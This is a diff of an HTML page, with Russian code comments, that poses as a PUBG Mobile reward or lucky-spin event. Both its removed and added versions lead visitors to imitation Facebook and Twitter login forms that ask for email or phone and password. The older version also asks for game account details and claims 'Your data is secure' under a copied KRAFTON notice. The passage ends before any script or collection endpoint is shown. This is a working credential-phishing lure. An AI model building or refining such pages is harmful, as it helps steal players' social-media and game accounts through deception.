@@ -10,645 +10,792 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', 'Arial', sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #0a1931 0%, #1a1a2e 100%);
+            background: #000;
             color: #fff;
             min-height: 100vh;
             overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-            background: rgba(10, 25, 49, 0.9);
-            min-height: 100vh;
-            border-left: 1px solid #2a3b5c;
-            border-right: 1px solid #2a3b5c;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.7);
-        }
-
-        /* Header Styles */
-        .header {
-            text-align: center;
-            padding: 20px 0;
             position: relative;
-            margin-bottom: 30px;
         }
 
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 10%;
-            width: 80%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #ffd700, transparent);
-        }
-
-        .pubg-title {
-            font-size: 32px;
-            font-weight: 900;
-            background: linear-gradient(45deg, #ffd700, #ff6b00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-            margin-bottom: 5px;
-        }
-
-        .sub-title {
-            font-size: 18px;
-            color: #aaa;
-            font-weight: 300;
-            letter-spacing: 1px;
-        }
-
-        /* Event Banner */
-        .event-banner {
-            background: linear-gradient(135deg, #1a3a5f 0%, #2a4b7c 100%);
-            border-radius: 15px;
-            padding: 25px;
-            text-align: center;
-            margin-bottom: 30px;
-            border: 2px solid #3a5b9c;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .event-banner::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 215, 0, 0.1),
-                transparent
-            );
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-
-        .event-title {
-            font-size: 24px;
-            color: #ffd700;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            font-weight: 700;
-        }
-
-        .event-subtitle {
-            font-size: 16px;
-            color: #aaa;
-            margin-bottom: 20px;
-        }
-
-        /* Rewards Section */
-        .rewards-section {
-            margin-bottom: 30px;
-        }
-
-        .section-title {
-            font-size: 20px;
-            color: #ffd700;
-            margin-bottom: 20px;
-            padding-left: 10px;
-            border-left: 3px solid #ff6b00;
-            text-transform: uppercase;
-        }
-
-        .rewards-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-
-        .reward-item {
-            background: rgba(42, 59, 92, 0.7);
-            border-radius: 10px;
-            padding: 15px;
-            text-align: center;
-            border: 1px solid #3a5b9c;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .reward-item:hover {
-            transform: translateY(-5px);
-            border-color: #ffd700;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
-        }
-
-        .reward-image {
-            width: 80px;
-            height: 80px;
-            object-fit: contain;
-            margin-bottom: 10px;
-            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
-        }
-
-        .reward-name {
-            font-size: 14px;
-            color: #fff;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .reward-type {
-            font-size: 12px;
-            color: #ffd700;
-            background: rgba(255, 215, 0, 0.1);
-            padding: 2px 8px;
-            border-radius: 10px;
-            display: inline-block;
-        }
-
-        /* Login Methods */
-        .login-methods {
-            background: rgba(26, 43, 73, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            border: 1px solid #3a5b9c;
-        }
-
-        .method-option {
-            display: flex;
-            align-items: center;
-            background: rgba(42, 59, 92, 0.9);
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 2px solid transparent;
-        }
-
-        .method-option:hover {
-            background: rgba(58, 91, 156, 0.9);
-            transform: translateX(5px);
-        }
-
-        .method-option.selected {
-            border-color: #ffd700;
-            background: rgba(58, 91, 156, 0.9);
-        }
-
-        .method-icon {
-            width: 40px;
-            height: 40px;
-            background: #3a5b9c;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            font-size: 20px;
-            color: #fff;
-        }
-
-        .method-icon.facebook { background: #1877f2; }
-        .method-icon.twitter { background: #1da1f2; }
-        .method-icon.vk { background: #4c75a3; }
-
-        .method-text {
-            flex-grow: 1;
-        }
-
-        .method-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #fff;
-        }
-
-        .method-desc {
-            font-size: 12px;
-            color: #aaa;
-        }
-
-        /* Form Styles */
-        .form-section {
-            background: rgba(26, 43, 73, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            border: 1px solid #3a5b9c;
-            display: none;
-        }
-
-        .form-section.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            display: block;
-            color: #ffd700;
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(42, 59, 92, 0.9);
-            border: 1px solid #3a5b9c;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            transition: all 0.3s;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #ffd700;
-            box-shadow: 0 0 0 2px rgba(255, 215, 0, 0.2);
-        }
-
-        .form-input::placeholder {
-            color: #888;
-        }
-
-        /* Buttons */
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(45deg, #ff6b00, #ffd700);
-            color: #000;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(255, 107, 0, 0.4);
-        }
-
-        .btn-secondary {
-            background: rgba(42, 59, 92, 0.9);
-            color: #fff;
-            border: 1px solid #3a5b9c;
-        }
-
-        .btn-secondary:hover {
-            background: rgba(58, 91, 156, 0.9);
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
+        /* Фоновые обои */
+        .background-wallpaper {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 1000;
+            background: 
+                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)),
+                url('https://share.google/x8DRJEzACUjxSmMSp');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: -2;
+        }
+
+        .overlay-gradient {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                135deg,
+                rgba(255, 107, 0, 0.1) 0%,
+                rgba(255, 215, 0, 0.05) 50%,
+                rgba(26, 26, 46, 0.9) 100%
+            );
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0;
+            min-height: 100vh;
+            background: rgba(10, 10, 20, 0.85);
+            backdrop-filter: blur(10px);
+        }
+
+        /* Верхний баннер */
+        .top-banner {
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.3), rgba(255, 215, 0, 0.2));
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 2px solid #ff6b00;
+        }
+
+        .top-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100%;
+            background: url('https://i.imgur.com/pattern.png');
+            opacity: 0.1;
+            z-index: 0;
+        }
+
+        .main-title {
+            font-size: 36px;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .sub-title {
+            font-size: 18px;
+            color: #fff;
+            font-weight: 300;
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        /* Рулетка секция */
+        .slot-machine-section {
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .slot-container {
+            width: 280px;
+            height: 280px;
+            margin: 0 auto 30px;
+            position: relative;
+            perspective: 1000px;
+        }
+
+        .slot-wheel {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.1s;
+        }
+
+        .slot-item {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-        }
-
-        .modal-content {
-            background: linear-gradient(135deg, #1a3a5f 0%, #2a4b7c 100%);
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.2), rgba(255, 215, 0, 0.1));
+            border: 3px solid rgba(255, 215, 0, 0.5);
             border-radius: 20px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            border: 3px solid #ffd700;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+            backface-visibility: hidden;
+            transform-origin: center;
+            box-shadow: 
+                0 0 30px rgba(255, 107, 0, 0.3),
+                inset 0 0 40px rgba(255, 215, 0, 0.1);
+        }
+
+        .slot-image {
+            width: 120px;
+            height: 120px;
+            object-fit: contain;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.5));
+        }
+
+        .slot-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .slot-type {
+            font-size: 14px;
+            color: #aaa;
+            margin-top: 5px;
+        }
+
+        .spin-button {
+            background: linear-gradient(45deg, #ff6b00, #ffd700);
+            border: none;
+            border-radius: 25px;
+            padding: 20px 50px;
+            font-size: 22px;
+            font-weight: bold;
+            color: #000;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 0 auto;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 10px 30px rgba(255, 107, 0, 0.4);
+        }
+
+        .spin-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255, 107, 0, 0.6);
+        }
+
+        .spin-button:disabled {
+            background: linear-gradient(45deg, #666, #888);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Выпадающие предметы */
+        .prize-drop-section {
+            padding: 20px;
+            background: rgba(20, 20, 40, 0.8);
+            margin: 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .prize-drop-title {
             text-align: center;
-            animation: modalSlideIn 0.5s ease;
-        }
-
-        @keyframes modalSlideIn {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .modal-icon {
-            font-size: 80px;
+            font-size: 20px;
             color: #ffd700;
             margin-bottom: 20px;
-            animation: bounce 1s ease infinite alternate;
-        }
-
-        @keyframes bounce {
-            from { transform: scale(1); }
-            to { transform: scale(1.1); }
-        }
-
-        .modal-title {
-            font-size: 28px;
-            color: #ffd700;
-            margin-bottom: 15px;
             text-transform: uppercase;
         }
 
-        .modal-text {
-            font-size: 16px;
+        .prize-drop-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .prize-drop-item {
+            background: rgba(255, 107, 0, 0.1);
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s;
+            animation: float 3s ease-in-out infinite;
+            animation-delay: calc(var(--item-index) * 0.2s);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .prize-drop-item:hover {
+            transform: scale(1.05);
+            border-color: #ffd700;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .prize-drop-image {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
+        }
+
+        .prize-drop-name {
+            font-size: 12px;
             color: #fff;
-            margin-bottom: 25px;
+            font-weight: bold;
+        }
+
+        /* Кнопки входа */
+        .login-buttons {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .login-button {
+            display: flex;
+            align-items: center;
+            background: rgba(30, 30, 60, 0.8);
+            border: 2px solid #3a5b9c;
+            border-radius: 15px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .login-button:hover {
+            background: rgba(58, 91, 156, 0.8);
+            transform: translateX(10px);
+            border-color: #ffd700;
+        }
+
+        .login-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-right: 20px;
+            color: white;
+        }
+
+        .facebook-icon { background: #1877f2; }
+        .twitter-icon { background: #1da1f2; }
+
+        .login-text {
+            flex-grow: 1;
+            text-align: left;
+        }
+
+        .login-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+
+        .login-desc {
+            font-size: 14px;
+            color: #aaa;
+        }
+
+        .arrow {
+            color: #ffd700;
+            font-size: 20px;
+        }
+
+        /* Страницы входа (скрыты по умолчанию) */
+        .page {
+            display: none;
+            padding: 20px;
+            min-height: 100vh;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Facebook страница */
+        .facebook-page {
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+
+        .fb-header {
+            background: #fff;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+            letter-spacing: -1px;
+        }
+
+        .fb-title {
+            color: #1c1e21;
+            font-size: 20px;
+            font-weight: normal;
+            margin: 0;
+        }
+
+        .fb-form {
+            padding: 25px;
+            background: #fff;
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+            margin-bottom: 16px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .fb-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        .fb-button {
+            width: 100%;
+            padding: 16px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: Helvetica, Arial, sans-serif;
+            margin-bottom: 16px;
+        }
+
+        .fb-button:hover {
+            background: #166fe5;
+        }
+
+        .fb-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .fb-divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .fb-create {
+            background: #42b72a;
+        }
+
+        .fb-create:hover {
+            background: #36a420;
+        }
+
+        /* Twitter страница */
+        .twitter-page {
+            background: #000;
+            color: #fff;
+        }
+
+        .twitter-header {
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .twitter-logo {
+            color: #1da1f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        .twitter-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .twitter-subtitle {
+            color: #6e767d;
+            font-size: 16px;
+        }
+
+        .twitter-form {
+            padding: 25px;
+        }
+
+        .twitter-input {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 2px solid #2f3336;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .twitter-input:focus {
+            border-color: #1da1f2;
+            outline: none;
+        }
+
+        .twitter-button {
+            width: 100%;
+            padding: 16px;
+            background: #1da1f2;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .twitter-button:hover {
+            background: #1a8cd8;
+        }
+
+        /* Кнопка отмены */
+        .cancel-button {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 107, 0, 0.2);
+            border: 2px solid #ff6b00;
+            color: #ffd700;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            z-index: 100;
+        }
+
+        .cancel-button:hover {
+            background: rgba(255, 107, 0, 0.4);
+            transform: translateX(-50%) scale(1.05);
+        }
+
+        /* Модальное окно с поздравлением */
+        .congrats-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .congrats-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 25px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 3px solid #ffd700;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
+            animation: modalAppear 0.5s ease;
+        }
+
+        @keyframes modalAppear {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .congrats-icon {
+            font-size: 80px;
+            color: #ffd700;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-20px); }
+        }
+
+        .congrats-title {
+            font-size: 32px;
+            color: #ffd700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .congrats-text {
+            font-size: 18px;
+            color: #fff;
+            margin-bottom: 30px;
             line-height: 1.5;
         }
 
-        .reward-code {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 25px 0;
+        .prize-display {
+            background: rgba(255, 215, 0, 0.1);
             border: 2px dashed #ffd700;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
         }
 
-        .code {
+        .prize-image {
+            width: 100px;
+            height: 100px;
+            object-fit: contain;
+            margin: 0 auto 15px;
+            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.5));
+        }
+
+        .prize-name {
             font-size: 24px;
             color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .code-display {
+            font-size: 20px;
+            color: #00ff95;
             font-family: 'Courier New', monospace;
-            letter-spacing: 3px;
-            font-weight: 700;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border: 1px solid #00ff95;
         }
 
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 215, 0, 0.3);
-            border-radius: 50%;
-            border-top-color: #ffd700;
-            animation: spin 1s ease-in-out infinite;
+        /* Конфетти эффект */
+        .confetti {
+            position: fixed;
+            width: 15px;
+            height: 15px;
+            pointer-events: none;
+            z-index: 999;
+            animation: confettiFall 5s linear forwards;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
         }
 
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 20px 0;
-            color: #888;
-            font-size: 12px;
-            border-top: 1px solid #2a3b5c;
-            margin-top: 30px;
-        }
-
-        /* Responsive */
+        /* Адаптивность */
         @media (max-width: 480px) {
             .container {
-                padding: 15px;
-                border: none;
+                max-width: 100%;
             }
             
-            .pubg-title {
-                font-size: 24px;
+            .main-title {
+                font-size: 28px;
             }
             
-            .rewards-grid {
-                grid-template-columns: 1fr;
-                gap: 10px;
+            .slot-container {
+                width: 250px;
+                height: 250px;
             }
             
-            .modal-content {
+            .prize-drop-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .congrats-content {
                 padding: 25px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="pubg-title">PUBG MOBILE</div>
-            <div class="sub-title">METRO ROYALE PASS SIG</div>
-        </div>
+    <!-- Фоновые обои -->
+    <div class="background-wallpaper"></div>
+    <div class="overlay-gradient"></div>
 
-        <!-- Event Banner -->
-        <div class="event-banner">
-            <div class="event-title">HALLOWEEN LUCKY SPIN</div>
-            <div class="event-subtitle">Login to receive your reward</div>
-            <div style="font-size: 14px; color: #ffd700; margin-top: 10px;">
-                <i class="fas fa-gift"></i> Limited Time Event
+    <!-- Главная страница -->
+    <div class="page active" id="mainPage">
+        <div class="container">
+            <!-- Верхний баннер -->
+            <div class="top-banner">
+                <h1 class="main-title">PUBG MOBILE</h1>
+                <p class="sub-title">METRO ROYALE PASS SIGNATURE</p>
             </div>
-        </div>
 
-        <!-- Available Rewards -->
-        <div class="rewards-section">
-            <div class="section-title">AVAILABLE REWARDS</div>
-            <div class="rewards-grid" id="rewardsGrid">
-                <!-- Rewards will be populated by JavaScript -->
+            <!-- Рулетка -->
+            <div class="slot-machine-section">
+                <div class="slot-container">
+                    <div class="slot-wheel" id="slotWheel">
+                        <!-- Слоты будут добавлены через JavaScript -->
+                    </div>
+                </div>
+                
+                <button class="spin-button" id="spinButton">
+                    <i class="fas fa-dice"></i>
+                    SPIN TO WIN
+                </button>
             </div>
-        </div>
 
-        <!-- Login Methods -->
-        <div class="login-methods">
-            <div class="section-title">LOGIN METHOD</div>
-            
-            <div class="method-option selected" data-method="facebook">
-                <div class="method-icon facebook">
-                    <i class="fab fa-facebook-f"></i>
-                </div>
-                <div class="method-text">
-                    <div class="method-title">Login With Facebook</div>
-                    <div class="method-desc">Log in to your Facebook account</div>
-                </div>
-                <div class="checkmark">
-                    <i class="fas fa-check-circle" style="color: #ffd700;"></i>
+            <!-- Выпадающие предметы -->
+            <div class="prize-drop-section">
+                <h3 class="prize-drop-title">AVAILABLE PRIZES</h3>
+                <div class="prize-drop-grid" id="prizeGrid">
+                    <!-- Призы будут добавлены через JavaScript -->
                 </div>
             </div>
-            
-            <div class="method-option" data-method="twitter">
-                <div class="method-icon twitter">
-                    <i class="fab fa-twitter"></i>
+
+            <!-- Кнопки входа -->
+            <div class="login-buttons">
+                <div class="login-button" onclick="showPage('facebookPage')">
+                    <div class="login-icon facebook-icon">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <div class="login-text">
+                        <div class="login-title">Login With Facebook</div>
+                        <div class="login-desc">Log in to your Facebook account</div>
+                    </div>
+                    <div class="arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
                 </div>
-                <div class="method-text">
-                    <div class="method-title">Login With Twitter</div>
-                    <div class="method-desc">Log in to your Twitter account</div>
-                </div>
-                <div class="checkmark">
-                    <i class="far fa-circle" style="color: #aaa;"></i>
+
+                <div class="login-button" onclick="showPage('twitterPage')">
+                    <div class="login-icon twitter-icon">
+                        <i class="fab fa-twitter"></i>
+                    </div>
+                    <div class="login-text">
+                        <div class="login-title">Login With Twitter</div>
+                        <div class="login-desc">Log in to your Twitter account</div>
+                    </div>
+                    <div class="arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
                 </div>
             </div>
-            
-            <button class="btn btn-primary" id="loginBtn">
-                <i class="fas fa-sign-in-alt"></i> LOGIN TO RECEIVE REWARD
+
+            <!-- Кнопка отмены -->
+            <button class="cancel-button" onclick="cancelAction()">
+                CANCEL
             </button>
-        </div>
-
-        <!-- Facebook Form -->
-        <div class="form-section" id="facebookForm">
-            <div class="section-title">FACEBOOK LOGIN</div>
-            
-            <form id="fbForm">
-                <div class="form-group">
-                    <label class="form-label">Mobile number or email address</label>
-                    <input type="text" class="form-input" id="fbEmail" placeholder="Enter email or phone" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <input type="password" class="form-input" id="fbPassword" placeholder="Enter password" required>
-                </div>
-                
-                <div class="form-group" style="text-align: right;">
-                    <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">
-                        Forgotten password?
-                    </a>
-                </div>
-                
-                <button type="submit" class="btn btn-primary" id="submitFbBtn">
-                    <i class="fas fa-lock"></i> LOG IN
-                </button>
-                
-                <button type="button" class="btn btn-secondary" id="cancelFbBtn" style="margin-top: 15px;">
-                    <i class="fas fa-times"></i> CANCEL
-                </button>
-            </form>
-        </div>
-
-        <!-- Twitter Form -->
-        <div class="form-section" id="twitterForm">
-            <div class="section-title">TWITTER LOGIN</div>
-            
-            <form id="twForm">
-                <div class="form-group">
-                    <label class="form-label">Phone, email, or username</label>
-                    <input type="text" class="form-input" id="twEmail" placeholder="Enter phone, email or username" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <input type="password" class="form-input" id="twPassword" placeholder="Enter password" required>
-                </div>
-                
-                <button type="submit" class="btn btn-primary" id="submitTwBtn">
-                    <i class="fab fa-twitter"></i> LOG IN TO TWITTER
-                </button>
-                
-                <button type="button" class="btn btn-secondary" id="cancelTwBtn" style="margin-top: 15px;">
-                    <i class="fas fa-times"></i> CANCEL
-                </button>
-            </form>
-        </div>
-
-        <!-- Verify Account -->
-        <div class="form-section" id="verifyForm">
-            <div class="section-title">VERIFY YOUR ACCOUNT</div>
-            
-            <form id="verifyAccountForm">
-                <div class="form-group">
-                    <label class="form-label">Character ID</label>
-                    <input type="text" class="form-input" id="charId" placeholder="Enter your Character ID" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Character Name</label>
-                    <input type="text" class="form-input" id="charName" placeholder="Enter character name" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Phone Number</label>
-                    <input type="tel" class="form-input" id="phoneNumber" placeholder="Enter phone number" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Account Level</label>
-                    <select class="form-input" id="accountLevel" required>
-                        <option value="">Select account level</option>
-                        <option value="1-20">1-20</option>
-                        <option value="21-40">21-40</option>
-                        <option value="41-60">41-60</option>
-                        <option value="61-80">61-80</option>
-                        <option value="81-100">81-100</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Platform</label>
-                    <select class="form-input" id="platform" required>
-                        <option value="">Select platform</option>
-                        <option value="android">Android</option>
-                        <option value="ios">iOS</option>
-                        <option value="emulator">Emulator</option>
-                    </select>
-                </div>
-                
-                <button type="submit" class="btn btn-primary" id="submitVerifyBtn">
-                    <i class="fas fa-check-circle"></i> SUBMIT
-                </button>
-            </form>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <div style="margin-bottom: 10px;">
-                <i class="fas fa-shield-alt" style="color: #ffd700;"></i>
-                Your data is secure
-            </div>
-            <div>PUBG MOBILE © 2024 KRAFTON, Inc. All rights reserved.</div>
         </div>
     </div>
 
-    <!-- Success Modal -->
-    <div class="modal" id="successModal">
-        <div class="modal-content">
-            <div class="modal-icon">🎁</div>
-            <div class="modal-title">CONGRATULATIONS!</div>
-            <div class="modal-text">
-                Hi Survivor, your account has been processed to receive your selected rewards.
+    <!-- Facebook страница -->
+    <div class="page facebook-page" id="facebookPage">
+        <div class="container" style="background: #f0f2f5;">
+            <div class="fb-header">
+                <div class="fb-logo">facebook</div>
+                <div class="fb-title">Log in to your Facebook account to connect to PUBG MOBILE</div>
+            </div>
+            
+            <div class="fb-form">
+                <input type="text" class="fb-input" id="fbEmail" placeholder="Mobile number or email address" required>
+                <input type="password" class="fb-input" id="fbPassword" placeholder="Password" required>
+                
+                <button class="fb-button" onclick="submitFacebook()">Log In</button>
+                
+                <a href="#" class="fb-link">Forgotten password?</a>
+                
+                <hr class="fb-divider">
+                
+                <button class="fb-button fb-create">Create account</button>
+                <button class="fb-button" onclick="cancelAction()" style="background: #65676b;">Not now</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Twitter страница -->
+    <div class="page twitter-page" id="twitterPage">
+        <div class="container" style="background: #000;">
+            <div class="twitter-header">
+                <div class="twitter-logo">
+                    <i class="fab fa-twitter"></i>
+                </div>
